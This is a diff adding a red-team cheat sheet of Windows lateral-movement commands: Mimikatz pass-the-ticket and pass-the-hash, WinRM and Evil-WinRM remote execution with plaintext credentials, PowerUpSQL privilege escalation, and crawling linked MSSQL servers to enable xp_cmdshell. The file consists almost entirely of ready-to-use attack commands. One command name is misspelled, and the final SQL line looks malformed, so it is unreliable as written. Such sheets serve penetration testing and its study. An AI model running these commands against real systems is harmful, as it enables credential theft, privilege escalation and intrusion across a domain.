@@ -1,0 +1,45 @@
+# Lateral Movement
+# https://morph3sec.com/Cheat-Sheets/Windows-Red-Team-Cheat-Sheet/
+
+## PsExec, SmbExec, WMIExec, RDP, PTH in general.
+## WinRM is always good. Check groups carefully.
+## Since windows gave support to OpenSSH we should also consider SSH.
+
+## Mimikatz Ticket PTH
+Enable-PSRemoting
+mimikatz.exe '" kerberos:ptt C:\Users\Public\ticketname.kirbi"' "exit"
+Enter-PSSession -ComputerName ECORP
+
+## WinRM
+$pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential ('ECORP.local\morph3', $pass)
+Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }
+;; with Evil-WinRM
+git clone https://github.com/Hackplayers/evil-winrm; cd evil-winrm
+ruby evil-winrm.rb -i 192.168.1.2 -u morph3 -p morph3 -r evil.corp
+
+## PTH with mimikatz
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:command"'
+
+## Database Links
+
+# PowerUpSQL
+https://github.com/NetSPI/PowerUpSQL
+Get-SQLServerLink -Instance server -Verbose
+powershell.exe -c "Import-Module C:\Users\Public\PowerUpSQL.ps1; Invoke-SQLEscalatePriv -Verbose -Instance ECORP\sql"
+
+# To see servers 
+select srvname from master..sysservers;
+
+# Native
+Get-SQLServerLinkCrawl -Instance server -Query "exec master..xp_cmdshell 'whoami'"
+
+# Linked database tables
+select * from openquery("ECORP\FOO", 'select TABLE_NAME from FOO.INFORMATION_SCHEMA.TABLES') 
+
+# You can also use meterpreter module exploit/windows/mssql/mssql_linkcrawler
+# With meterpreter module you can find linked databases and if you are admin on them
+# You can do a query and try to enable xp_cmpshell on that server
+select * from openquery("server",'select * from master..sysservers') EXECUTE AS USER = 'internal_user' ('sp_configure "xp_cmdshell",1;reconfigure;') AT "server"
+
+
